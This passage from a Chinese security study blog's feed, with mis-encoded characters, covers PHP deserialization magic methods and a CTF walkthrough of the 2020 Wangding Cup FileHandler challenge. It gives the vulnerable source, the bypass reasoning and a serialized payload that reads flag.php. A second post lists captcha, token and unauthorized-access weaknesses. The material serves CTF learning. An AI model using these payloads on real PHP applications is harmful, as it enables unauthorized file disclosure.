class="line">è°ƒç”¨äº†ææ„å‡½æ•°</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å½“æˆ‘ä»¬åˆ›å»ºäº†å¯¹è±¡aæ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨äº†<code>__construct</code>å‡½æ•°ï¼Œç„¶åå½“æˆ‘ä»¬è°ƒç”¨ååºåˆ—åŒ–å‡½æ•°<code>unserialize</code>è‡ªåŠ¨è°ƒç”¨äº†<code>__wakeup</code>å‡½æ•°ï¼Œå½“ç¨‹åºç»“æŸçš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨äº†<code>__destruct</code>å‡½æ•°ã€‚è¿™å°±æ˜¯ç±»ä¸­é­”æœ¯æ–¹æ³•çš„è§¦å‘æ¡ä»¶ã€‚å½“ç„¶è¿™é‡Œæ²¡æœ‰ä¸¾ä¾‹å‡ºè°ƒç”¨<code>serialize</code>æ—¶è§¦å‘çš„é­”æœ¯å‡½æ•°ï¼Œå®ƒæ˜¯<code>__sleep</code>å‡½æ•°ã€‚</p><h2 id="æ¼”ç¤ºæ¡ˆä¾‹"><a href="#æ¼”ç¤ºæ¡ˆä¾‹" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹"></a>æ¼”ç¤ºæ¡ˆä¾‹</h2><h3 id="å…ˆæä¸€æŠŠ-PHP-ååºåˆ—åŒ–çƒ­èº«é¢˜ç¨³ä½-æ— ç±»é—®é¢˜-æœ¬åœ°"><a href="#å…ˆæä¸€æŠŠ-PHP-ååºåˆ—åŒ–çƒ­èº«é¢˜ç¨³ä½-æ— ç±»é—®é¢˜-æœ¬åœ°" class="headerlink" title="å…ˆæä¸€æŠŠ PHP ååºåˆ—åŒ–çƒ­èº«é¢˜ç¨³ä½-æ— ç±»é—®é¢˜-æœ¬åœ°"></a>å…ˆæä¸€æŠŠ PHP ååºåˆ—åŒ–çƒ­èº«é¢˜ç¨³ä½-æ— ç±»é—®é¢˜-æœ¬åœ°</h3><p>test.phpæ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$KEY</span> = <span class="string">&quot;xiaodi&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (unserialize(<span class="variable">$str</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>flag.phpæ–‡ä»¶å†…å®¹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;&#123;abcdefghigjl&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>URLï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xlh/test.php?str=s:6:&quot;xiaodi&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211120309.png" alt="image-20210920204813392"></p><h3 id="æœ€åé¡¶ä¸€æŠŠç½‘é¼æ¯-2020-é’é¾™å¤§çœŸé¢˜èˆ’æœä¸‹-æœ‰ç±»é­”æœ¯æ–¹æ³•è§¦å‘-å®ä¾‹"><a href="#æœ€åé¡¶ä¸€æŠŠç½‘é¼æ¯-2020-é’é¾™å¤§çœŸé¢˜èˆ’æœä¸‹-æœ‰ç±»é­”æœ¯æ–¹æ³•è§¦å‘-å®ä¾‹" class="headerlink" title="æœ€åé¡¶ä¸€æŠŠç½‘é¼æ¯ 2020 é’é¾™å¤§çœŸé¢˜èˆ’æœä¸‹-æœ‰ç±»é­”æœ¯æ–¹æ³•è§¦å‘-å®ä¾‹"></a>æœ€åé¡¶ä¸€æŠŠç½‘é¼æ¯ 2020 é’é¾™å¤§çœŸé¢˜èˆ’æœä¸‹-æœ‰ç±»é­”æœ¯æ–¹æ³•è§¦å‘-å®ä¾‹</h3><p><strong>æºç ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä»£ç å¯ä»¥çœ‹å‡ºæ¥ï¼ŒGETæ–¹å¼ä¼ å…¥åºåˆ—åŒ–çš„strå­—ç¬¦ä¸²ï¼Œstrå­—ç¬¦ä¸²ä¸­æ¯ä¸€ä¸ªå­—ç¬¦çš„ASCIIèŒƒå›´åœ¨32åˆ°125ä¹‹é—´ï¼Œç„¶åå¯¹å…¶ååºåˆ—åŒ–ã€‚å½“æ‰§è¡Œ<code>unserialize</code>å‡½æ•°æ—¶ï¼Œä¼šè°ƒç”¨<code>__destruct</code>å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">        <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>===</code>ä»£è¡¨å¼ºç±»å‹æ¯”è¾ƒï¼Œéœ€è¦æ•°å€¼å’Œç±»å‹éƒ½ç›¸ç­‰æ‰æ˜¯ç›¸ç­‰ã€‚æ‰€æœ‰å¦‚æœæˆ‘ä»¬è¿™é‡Œè¾“å…¥2æˆ–è€…â€™ 2â€™éƒ½å¯ä»¥ç»•è¿‡ã€‚ç»•è¿‡ä»¥åå°±ä¼šè¿›å…¥<code>process()</code>å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>process</code>å‡½æ•°ä¸­ï¼Œop==â€2â€æ˜¯å¼±ç±»å‹æ¯”è¾ƒ==ï¼Œæ•°å€¼ç›¸ç­‰å°±æ˜¯æƒ³ç›¸ç­‰ï¼Œæ‰€æœ‰æˆ‘ä»¬ä¹‹å‰çš„è¾“å…¥å’Œè¿™é‡Œæ˜¯ç›¸ç­‰çš„ï¼Œç„¶åå°±ä¼šæ‰§è¡Œreadå‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">        <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>readå‡½æ•°ä¼šæ ¹æ®filenameè¯»å–æ–‡ä»¶ã€‚ç„¶åæ‰§è¡Œoutputå‡½æ•°å°†è¯»åˆ°çš„å†…å®¹è¿›è¡Œè¾“å‡ºã€‚</p><p>æ•´ä¸ªåˆ©ç”¨æ€è·¯å°±å¾ˆæ˜æ˜¾äº†ï¼Œè¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼Œ$op,$filename,$contentä¸‰ä¸ªå˜é‡æƒé™éƒ½æ˜¯protectedï¼Œè€Œprotectedæƒé™çš„å˜é‡åœ¨åºåˆ—åŒ–çš„æ—¶ä¼šæœ‰%00*%00å­—ç¬¦ï¼Œ%00å­—ç¬¦çš„ASCIIç ä¸º0ï¼Œå°±æ— æ³•é€šè¿‡ä¸Šé¢çš„is_validå‡½æ•°æ ¡éªŒã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109202203836.png" alt="image-20210920220344786"></p><p>è¿™é‡Œç»•è¿‡æ–¹æ³•å°±æ˜¯ä¿®æ”¹ç†Ÿæ‚‰ä¸ºpublicï¼Œphp7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæœ¬åœ°åºåˆ—åŒ–çš„æ—¶å€™å°†å±æ€§æ”¹ä¸ºpublicè¿›è¡Œç»•è¿‡å³å¯</p><p>æ‰€ä»¥æœ€åæˆ‘ä»¬çš„ä»£ç æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;<span class="comment">//æºç å‘Šè¯‰æˆ‘ä»¬ op ä¸º 1 æ—¶å€™æ˜¯æ‰§è¡Œå†™å…¥ä¸º 2 æ—¶æ‰§è¡Œè¯»</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;<span class="comment">//æ–‡ä»¶å¼€å¤´è°ƒç”¨çš„æ˜¯ flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&quot;xd&quot;</span>;     <span class="comment">//éšä¾¿å†™çš„ï¼Œå› ä¸ºè¦ä¸‰ä¸ªå‚æ•°</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = serialize(<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œåºåˆ—åŒ–ä¸€ä¸‹æ˜¯ï¼šæ‰€ä»¥æœ€åçš„ç»“æœå°±æ˜¯è¿™ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:2:&quot;xd&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="æ¶‰åŠèµ„æºï¼š"><a href="#æ¶‰åŠèµ„æºï¼š" class="headerlink" title="æ¶‰åŠèµ„æºï¼š"></a>æ¶‰åŠèµ„æºï¼š</h2><ul><li><a href="http://www.dooccn.com/php/">http://www.dooccn.com/php/</a></li><li><a href="https://www.ctfhub.com/#/challenge">https://www.ctfhub.com/#/challenge</a></li><li><a href="https://ctf.bugku.com/challenges#flag.php">https://ctf.bugku.com/challenges#flag.php</a></li><li><a href="https://cgctf.nuptsast.com/challenges#Web">https://cgctf.nuptsast.com/challenges#Web</a></li><li><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> PHPååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>36WEBæ¼æ´-é€»è¾‘è¶Šæƒä¹‹éªŒè¯ç ä¸TokenåŠæ¥å£</title>
      <link href="/2021/09/21/36WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/"/>
      <url>/2021/09/21/36WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="éªŒè¯å®‰å…¨"><a href="#éªŒè¯å®‰å…¨" class="headerlink" title="éªŒè¯å®‰å…¨"></a>éªŒè¯å®‰å…¨</h3><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109191700595.png" alt="image-20210919170012434" style="zoom:50%;" /><h4 id="éªŒè¯ç å®‰å…¨"><a href="#éªŒè¯ç å®‰å…¨" class="headerlink" title="éªŒè¯ç å®‰å…¨"></a>éªŒè¯ç å®‰å…¨</h4><p><strong>åˆ†ç±»</strong></p><p>å›¾ç‰‡ï¼Œæ‰‹æœºæˆ–é‚®ç®±ï¼Œè¯­éŸ³ï¼Œè§†é¢‘ï¼Œæ“ä½œç­‰</p><p><strong>åŸç†</strong></p><p>éªŒè¯ç”Ÿæˆæˆ–éªŒè¯è¿‡ç¨‹ä¸­çš„é€»è¾‘é—®é¢˜</p><p><strong>å±å®³</strong></p><p>è´¦æˆ·æƒé™æ³„æ¼ï¼ŒçŸ­ä¿¡è½°ç‚¸ï¼Œéå†ï¼Œä»»æ„ç”¨æˆ·æ“ä½œç­‰</p><p><strong>æ¼æ´</strong></p><p>å®¢æˆ·ç«¯å›æ˜¾ï¼ŒéªŒè¯ç å¤ç”¨ï¼ŒéªŒè¯ç çˆ†ç ´ï¼Œç»•è¿‡ç­‰</p><p><strong>éªŒè¯ç è¯†åˆ«æ’ä»¶å·¥å…·ä½¿ç”¨</strong></p><ul><li>Pkav_Http_Fuzz(ä¸å¥½ç”¨)</li><li>captcha-killerï¼ˆburpæ’ä»¶ï¼‰</li><li>reCAPTCHA </li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/cwkiller/p/12659549.html</span><br></pre></td></tr></table></figure><p><strong>æœåŠ¡ç«¯éªŒè¯</strong></p><p>ç¬¬ä¸€æ¬¡è¾“å…¥æ­£ç¡®çš„éªŒè¯ç ï¼Œä¹‹åä½¿ç”¨åŒæ ·çš„éªŒè¯ç è¿›è¡Œå‘åŒ…ï¼Œä»è€ŒæˆåŠŸç»•è¿‡ã€‚è¿™æ˜¯å› ä¸ºæœåŠ¡å™¨åœ¨åˆ¤æ–­çš„æ—¶å€™ï¼Œåªæ˜¯å°†ç¬¬ä¸€æ¬¡è¿›è¡ŒéªŒè¯ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªsessionï¼ŒéªŒè¯ç»“æŸåæ²¡æœ‰åˆ é™¤sessionï¼Œå¯¼è‡´ä¹‹åå¯ä»¥ä¸€ç›´ä½¿ç”¨è¯¥éªŒè¯ç è¿›è¡ŒéªŒè¯ã€‚</p><p><strong>å®¢æˆ·ç«¯éªŒè¯</strong></p><p>é€šè¿‡è°ƒç”¨JSä»£ç è¿›è¡ŒéªŒè¯ç çš„éªŒè¯å·¥ä½œã€‚å¯ä»¥æŸ¥çœ‹å‰ç«¯JSä»£ç ï¼Œæˆ–è€…networkä¸­åŠ è½½çš„JSæ–‡ä»¶æ¥ç¡®å®šæ˜¯ä¸æ˜¯å‰ç«¯éªŒè¯ã€‚</p><h4 id="token-å®‰å…¨"><a href="#token-å®‰å…¨" class="headerlink" title="token å®‰å…¨"></a>token å®‰å…¨</h4><p><strong>åŸç†</strong></p><p>Tokenæ˜¯æœåŠ¡ç«¯ç”Ÿæˆçš„ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œä»¥ä½œå®¢æˆ·ç«¯è¿›è¡Œè¯·æ±‚çš„ä¸€ä¸ªä»¤ç‰Œï¼Œå½“ç¬¬ä¸€æ¬¡ç™»å½•åï¼ŒæœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªTokenä¾¿å°†æ­¤Tokenè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œä»¥åå®¢æˆ·ç«¯åªéœ€å¸¦ä¸Šè¿™ä¸ªTokenå‰æ¥è¯·æ±‚æ•°æ®å³å¯ï¼Œæ— éœ€å†æ¬¡å¸¦ä¸Šç”¨æˆ·åå’Œå¯†ç ã€‚</p><p><strong>token å®¢æˆ·ç«¯å›æ˜¾</strong></p><p>tokenåœ¨å‰ç«¯æœ‰å›æ˜¾ï¼Œå¯ä»¥è·å–åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_44110913/article/details/109368455</span><br></pre></td></tr></table></figure><p><strong>tokenæ— å›æ˜¾</strong></p><p>çœ‹çœ‹æ˜¯å¦æœ‰è§„å¾‹ï¼Œæ˜¯å¦å¯ä»¥çˆ†ç ´ï¼Œä¸€èˆ¬éƒ½ä¸è¡Œ</p><h3 id="æ¥å£å®‰å…¨é—®é¢˜"><a href="#æ¥å£å®‰å…¨é—®é¢˜" class="headerlink" title="æ¥å£å®‰å…¨é—®é¢˜"></a>æ¥å£å®‰å…¨é—®é¢˜</h3><p>è°ƒç”¨ï¼Œéå†ï¼Œæœªæˆæƒï¼Œç¯¡æ”¹ç­‰</p><ul><li>è°ƒç”¨æ¡ˆä¾‹ï¼šçŸ­ä¿¡è½°ç‚¸</li><li>éå†æ¡ˆåˆ—ï¼šUID ç­‰éå†</li><li>callback å›è°ƒ JSONP</li></ul><h3 id="æœªæˆæƒè®¿é—®ï¼š"><a href="#æœªæˆæƒè®¿é—®ï¼š" class="headerlink" title="æœªæˆæƒè®¿é—®ï¼š"></a>æœªæˆæƒè®¿é—®ï¼š</h3><p>ä¸è¶Šæƒæ¼æ´åŒºåˆ«</p><ul><li>Jboss æœªæˆæƒè®¿é—®</li><li>Jenkins æœªæˆæƒè®¿é—®</li><li>ldap æœªæˆæƒè®¿é—®</li><li>Redis æœªæˆæƒè®¿é—®</li><li>elasticsearch æœªæˆæƒè®¿é—®</li><li>MenCache æœªæˆæƒè®¿é—®</li><li>Mongodb æœªæˆæƒè®¿é—®</li><li>Rsync æœªæˆæƒè®¿é—®</li><li>Zookeeper æœªæˆæƒè®¿é—®</li><li>Docker æœªæˆæƒè®¿é—®</li></ul><h3 id="æ¶‰åŠèµ„æºï¼š"><a href="#æ¶‰åŠèµ„æºï¼š" class="headerlink" title="æ¶‰åŠèµ„æºï¼š"></a>æ¶‰åŠèµ„æºï¼š</h3><ul><li><a href="https://www.lanzous.com/i1z2s3e">https://www.lanzous.com/i1z2s3e</a></li><li><a href="https://www.cnblogs.com/nul1/p/12071115.html">https://www.cnblogs.com/nul1/p/12071115.html</a></li><li><a href="https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2">https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2</a></li><li><a 